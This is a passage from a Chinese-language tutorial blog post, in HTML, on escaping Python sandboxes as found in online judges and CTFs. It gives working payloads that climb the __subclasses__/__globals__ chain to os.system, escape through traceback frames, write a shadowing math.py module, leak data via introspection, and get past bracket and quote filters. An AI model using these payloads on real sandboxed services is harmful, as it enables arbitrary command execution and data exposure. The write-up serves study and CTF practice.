class="hljs-number">29</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;builtin_function_or_method&#x27;</span>&gt;)<br>(<span class="hljs-number">30</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instancemethod&#x27;</span>&gt;)<br>(<span class="hljs-number">31</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;function&#x27;</span>&gt;)<br>(<span class="hljs-number">32</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classobj&#x27;</span>&gt;)<br>(<span class="hljs-number">33</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dictproxy&#x27;</span>&gt;)<br>(<span class="hljs-number">34</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span>&gt;)<br>(<span class="hljs-number">35</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;getset_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">36</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;wrapper_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">37</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;instance&#x27;</span>&gt;)<br>(<span class="hljs-number">38</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;ellipsis&#x27;</span>&gt;)<br>(<span class="hljs-number">39</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;member_descriptor&#x27;</span>&gt;)<br>(<span class="hljs-number">40</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span>&gt;)<br>(<span class="hljs-number">41</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;PyCapsule&#x27;</span>&gt;)<br>(<span class="hljs-number">42</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;cell&#x27;</span>&gt;)<br>(<span class="hljs-number">43</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;callable-iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">44</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;iterator&#x27;</span>&gt;)<br>(<span class="hljs-number">45</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.long_info&#x27;</span>&gt;)<br>(<span class="hljs-number">46</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.float_info&#x27;</span>&gt;)<br>(<span class="hljs-number">47</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;EncodingMap&#x27;</span>&gt;)<br>(<span class="hljs-number">48</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;fieldnameiterator&#x27;</span>&gt;)<br>(<span class="hljs-number">49</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;formatteriterator&#x27;</span>&gt;)<br>(<span class="hljs-number">50</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.version_info&#x27;</span>&gt;)<br>(<span class="hljs-number">51</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;sys.flags&#x27;</span>&gt;)<br>(<span class="hljs-number">52</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;exceptions.BaseException&#x27;</span>&gt;)<br>(<span class="hljs-number">53</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;module&#x27;</span>&gt;)<br>(<span class="hljs-number">54</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;imp.NullImporter&#x27;</span>&gt;)<br>(<span class="hljs-number">55</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;zipimport.zipimporter&#x27;</span>&gt;)<br>(<span class="hljs-number">56</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.stat_result&#x27;</span>&gt;)<br>(<span class="hljs-number">57</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;posix.statvfs_result&#x27;</span>&gt;)<br>(<span class="hljs-number">58</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.WarningMessage&#x27;</span>&gt;)<br>(<span class="hljs-number">59</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;warnings.catch_warnings&#x27;</span>&gt;)<br>(<span class="hljs-number">60</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;)<br>(<span class="hljs-number">61</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;)<br>(<span class="hljs-number">62</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Hashable&#x27;</span>&gt;)<br>(<span class="hljs-number">63</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;classmethod&#x27;</span>&gt;)<br>(<span class="hljs-number">64</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Iterable&#x27;</span>&gt;)<br>(<span class="hljs-number">65</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Sized&#x27;</span>&gt;)<br>(<span class="hljs-number">66</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Container&#x27;</span>&gt;)<br>(<span class="hljs-number">67</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_abcoll.Callable&#x27;</span>&gt;)<br>(<span class="hljs-number">68</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_keys&#x27;</span>&gt;)<br>(<span class="hljs-number">69</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_items&#x27;</span>&gt;)<br>(<span class="hljs-number">70</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;dict_values&#x27;</span>&gt;)<br>(<span class="hljs-number">71</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Printer&#x27;</span>&gt;)<br>(<span class="hljs-number">72</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site._Helper&#x27;</span>&gt;)<br>(<span class="hljs-number">73</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;)<br>(<span class="hljs-number">74</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Match&#x27;</span>&gt;)<br>(<span class="hljs-number">75</span>, &lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;)<br>(<span class="hljs-number">76</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;site.Quitter&#x27;</span>&gt;)<br>(<span class="hljs-number">77</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;)<br>(<span class="hljs-number">78</span>, &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;)<br></code></pre></td></tr></table></figure></p>
+<p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例（py3.x 中已经移除了这里 <code>__globals__</code> 的 <code>os</code>）：<br />
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">71</span>].<span class="hljs-symbol">_Printer__setup</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>]<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> from <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;</span>&gt;<br><br>&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：<br>&gt;&gt;&gt; [i.<span class="hljs-symbol">_Printer__setup</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>] for i in <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>() if i.<span class="hljs-symbol">__name__</span> == <span class="hljs-string">&quot;_Printer&quot;</span>]<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> from <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></p>
+<p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p>
+<p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> warnings<br><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.os<br>Traceback (most recent call last):<br>  File <span class="hljs-string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>AttributeError: <span class="hljs-string">&#x27;module&#x27;</span> <span class="hljs-built_in">object</span> has no attribute <span class="hljs-string">&#x27;os&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache<br>&lt;module <span class="hljs-string">&#x27;linecache&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc&#x27;</span>&gt;<br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>warnings.linecache.os<br>&lt;module <span class="hljs-string">&#x27;os&#x27;</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc&#x27;</span>&gt;<br></code></pre></td></tr></table></figure></p>
+<p>在继承链中就可以这样（py3.x 中已经移除了这里 <code>__globals__</code> 的 <code>linecache</code>）：<br />
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&gt;&gt;&gt; [].<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__base__</span>.<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-symbol">__dict__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>macr0phag3<br><span class="hljs-number">0</span><br>&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：<br>&gt;&gt;&gt; [i.<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-symbol">__dict__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>) for i in <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>() if i.<span class="hljs-symbol">__name__</span> == <span class="hljs-string">&quot;catch_warnings&quot;</span>]<br></code></pre></td></tr></table></figure><br />
+顺便说一下，<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：<br />
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">    def __init__(<span class="hljs-keyword">self</span>, <span class="hljs-keyword">record</span>=<span class="hljs-keyword">False</span>, <span class="hljs-keyword">module</span>=None):<br>...<br>        <span class="hljs-keyword">self</span>._module = sys.modules[<span class="hljs-string">&#x27;warnings&#x27;</span>] <span class="hljs-keyword">if</span> <span class="hljs-keyword">module</span> <span class="hljs-keyword">is</span> None <span class="hljs-keyword">else</span> <span class="hljs-keyword">module</span><br>...<br></code></pre></td></tr></table></figure></p>
+<p>所以通过<code>_module</code>也可以构造 payload（py3.x 中已经移除了 <code>catch_warnings</code> 的 <code>linecache</code>）：<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; <span class="hljs-selector-attr">[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == <span class="hljs-string">&#x27;catch_warnings&#x27;</span>]</span><span class="hljs-selector-attr">[0]</span>()._module<span class="hljs-selector-class">.linecache</span><span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>macr0phag3<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></p>
+<p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p>
+<p>同样，py3.x 中有<code>&lt;class 'os._wrap_close'&gt;</code>，利用方式可以为：<br />
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>()[<span class="hljs-number">133</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>macr0phag3<br><span class="hljs-number">0</span><br>&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：<br>&gt;&gt;&gt; [i for i in <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-symbol">__class__</span>.<span class="hljs-symbol">__mro__</span>[<span class="hljs-number">-1</span>].<span class="hljs-symbol">__subclasses__</span>() if i.<span class="hljs-symbol">__name__</span> == <span class="hljs-string">&quot;_wrap_close&quot;</span>][<span class="hljs-number">0</span>].<span class="hljs-symbol">__init__</span>.<span class="hljs-symbol">__globals__</span>[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>当然这样也是可以的（3.x）：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">set</span>.mro()[-<span class="hljs-number">1</span>].__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>顺便提一下，<code>object</code> 本来就是可以使用的，如果没过滤的话，payload 可以再简化为：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">object</span>.__subclasses__()[<span class="hljs-number">133</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：<br />
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[-<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">29</span>].<span class="hljs-variable">__call__</span>(eval, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure><br />
+或者简单一点：<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[]</span><span class="hljs-selector-class">.pop</span>.__class__.<span class="hljs-built_in">__call__</span>(eval, <span class="hljs-string">&#x27;1+1&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>上面这些 payload 大多数是直接 index 了，但是直接用 index 不太健壮，可以都换成列表推导式，用 <code>__name__</code> 来获取想要的 class，上面也举了好几个例子了，这里就不多说啦。</p>
+<p>最后再补充几个。</p>
+<p>可以这样利用：<br />
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">class <span class="hljs-built_in">test</span>(dict):<br>    def <span class="hljs-built_in">__init__</span>(self):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">super</span>(test, self).keys.__class__.<span class="hljs-built_in">__call__</span>(eval, <span class="hljs-string">&#x27;1+1&#x27;</span>))<br>        # 如果是 <span class="hljs-number">3</span>.x 的话可以简写为：<br>        # <span class="hljs-built_in">super</span>().keys.__class__.<span class="hljs-built_in">__call__</span>(eval, <span class="hljs-string">&#x27;1+1&#x27;</span>))<br><span class="hljs-built_in">test</span>()<br></code></pre></td></tr></table></figure></p>
+<p>还可以利用异常逃逸：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">hack = <span class="hljs-keyword">lambda</span> : [<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]<br><span class="hljs-keyword">try</span>:<br>    hack()<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    e.__traceback__.tb_next.tb_frame.f_globals[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>还可以利用 <code>format</code>：</p>
+<ol type="1">
+<li><code>"&#123;0.__class__.__base__&#125;".format([])</code></li>
+<li><code>"&#123;x.__class__.__base__&#125;".format(x=[])</code></li>
+<li><code>"&#123;.__class__.__base__&#125;".format([])</code></li>
+<li><code>("&#123;0.__class_"+"_.__base__&#125;").format([])</code></li>
+</ol>
+<p>（这里顺手记录下，对于字典键是整数型的比如 <code>&#123;"1":2&#125;</code>，format 是无法拿到值的 :)，这样会报错：<code>''' &#123;0['1']&#125; '''.format(&#123;"1":2&#125;)</code>，<code>'1'</code> 引号去掉的话又会报没有这个键，这个特性可以见<a target="_blank" rel="noopener" href="https://docs.python.org/3/library/string.html#format-string-syntax">文档</a>）</p>
+<p>上面的这些利用方式总结起来就是通过 <code>.mro()</code>、<code>__class__</code>、<code>type(...)</code>、<code>__mro__</code>、<code>__subclasses__</code>、<code>__base__</code>、<code>__bases__</code> 等属性/方法去获取 <code>object</code>，再根据<code>__globals__</code>找引入的<code>__builtins__</code>或者<code>eval</code>等等能够直接被利用的库，或者找到<code>builtin_function_or_method</code>类/类型<code>__call__</code>后直接运行<code>eval</code>。</p>
+<p>最后，其实沙箱逃逸，对于不同的第三方库可能会存在一些特殊的利用方式，比如 <code>jinja2</code>，这类属于 <code>SSTI</code> 漏洞，可以看这个：<a href="https://www.tr0y.wang/2022/04/13/SecMap-SSTI-jinja2/">传送门🚪</a>，这里就不多说了。</p>
+<p>其实 SSTI 也会用到这里的很多技巧，两者知识面相互交叠。</p>
+<h2 id="文件读写">文件读写</h2>
+<p>2.x 有个内建的 <code>file</code>：<br />
+<figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs delphi">&gt;&gt;&gt; <span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;key&#x27;</span>).<span class="hljs-keyword">read</span>()<br><span class="hljs-string">&#x27;Macr0phag3\n&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).<span class="hljs-keyword">write</span>(<span class="hljs-string">&#x27;Macr0phag3&#x27;</span>)<br>&gt;&gt;&gt; <span class="hljs-keyword">file</span>(<span class="hljs-string">&#x27;key&#x27;</span>).<span class="hljs-keyword">read</span>()<br><span class="hljs-string">&#x27;Macr0phag3&#x27;</span><br></code></pre></td></tr></table></figure></p>
+<p>还有个 <code>open</code>，2.x 与 3.x 通用。</p>
+<p>还有一些库，例如：<code>types.FileType</code>(rw)、<code>platform.popen</code>(rw)、<code>linecache.getlines</code>(r)。</p>
+<p>为什么说写比读危害大呢？因为如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来：<br />
+math.py：<br />
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;whoami&#x27;</span>))<br></code></pre></td></tr></table></figure><br />
+调用<br />
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> math</span><br>macr0phag3<br>0<br></code></pre></td></tr></table></figure><br />
+这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：<br />
+<figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;re&#x27;</span> <span class="hljs-keyword">in</span> sys.modules</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-string">&#x27;math&#x27;</span> <span class="hljs-keyword">in</span> sys.modules</span><br>False<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span><br></code></pre></td></tr></table></figure><br />
+当然在<code>import re</code> 之前<code>del sys.modules['re']</code>也不是不可以...</p>
+<p>最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 <code>test</code>的，如果把遍历测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。</p>
+<p>读文件暂时没什么发现特别的地方。</p>
+<p>剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：<br />
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&gt;&gt;&gt; __builtins__.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key&#x27;</span>).<span class="hljs-built_in">read</span>()<br><span class="hljs-string">&#x27;Macr0phag3\n&#x27;</span><br></code></pre></td></tr></table></figure><br />
+或者<br />
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sqf">&gt;&gt;&gt; ().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">40</span>](<span class="hljs-string">&#x27;key&#x27;</span>).read()<br><span class="hljs-string">&#x27;Macr0phag3&#x27;</span><br></code></pre></td></tr></table></figure></p>
+<h2 id="敏感信息泄露">敏感信息泄露</h2>
+<p>这个也算只能读吧。</p>
+<ol type="1">
+<li><code>dir()</code></li>
+<li><code>__import__("__main__").x</code>，其中 <code>__main__</code> 还会泄露脚本的绝对路径：<code>&lt;module '__main__' from 'xxx.py'&gt;</code></li>
+<li><code>__file__</code>，文件绝对路径</li>
+<li><code>x.__dict__</code></li>
+<li><code>locals()</code></li>
+<li><code>globals()</code></li>
+<li><code>vars()</code></li>
+<li><code>sys._getframe(0).f_code.co_varnames</code></li>
+<li><code>sys._getframe(0).f_locals</code></li>
+<li><code>inspect.x</code>，inspect 有很多方法可以获取信息，比如获取源码可以用 <code>inspect.getsource</code>，还有其他很多的功能</li>
+<li>...</li>
+</ol>
+<p>这有一篇不错的文章，推荐阅读：</p>
+<p>https://www.cnblogs.com/dechinphy/p/modify-locals.html</p>
+<h2 id="其他">其他</h2>
+<p>这些行为不像是 oj 会做得出来的，ctf 倒是有可能出现。</p>
+<h3 id="过滤">过滤 [ ]</h3>
+<p>应对的方式就是将<code>[]</code>的功能用<code>pop</code>、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）：<br />
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__.<span class="hljs-built_in">__getitem__</span>(<span class="hljs-number">2</span>).<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-class">.pop</span>(<span class="hljs-number">59</span>).__init__<span class="hljs-selector-class">.func_globals</span><span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;linecache&#x27;</span>)<span class="hljs-selector-class">.os</span><span class="hljs-selector-class">.popen</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>)<span class="hljs-selector-class">.read</span>()<br><span class="hljs-string">&#x27;macr0phag3\n&#x27;</span><br></code></pre></td></tr></table></figure></p>
+<p>当然，dict 也是可以 pop 的：<code>&#123;"a": 1&#125;.pop("a")</code></p>
+<p>当然也可以用 <code>next(iter())</code> 替代，或许可以加上 <code>max</code> 之类的玩意。</p>
+<h3 id="过滤引号">过滤引号</h3>
+<blockquote>
+<p>chr</p>
+</blockquote>
+<p>最简单就是用 <code>chr</code> 啦<br />
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">os<span class="hljs-selector-class">.system</span>(<br>    chr(<span class="hljs-number">119</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">104</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">111</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">109</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>)<br>)<br></code></pre></td></tr></table></figure></p>
+<blockquote>
+<p>扣字符</p>
+</blockquote>
+<p>利用 <code>str</code> 和 <code>[]</code>，挨个把字符拼接出来<br />
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">os<span class="hljs-selector-class">.system</span>(<br>    str(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[21]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[13]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[14]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[40]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[10]</span>+<span class="hljs-built_in">str</span>(()<span class="hljs-selector-class">.__class__</span><span class="hljs-selector-class">.__new__</span>)<span class="hljs-selector-attr">[3]</span><br>)<br></code></pre></td></tr></table></figure><br />
+当然 <code>[]</code> 如果被过滤了也可以 bypass，前面说过了。</p>
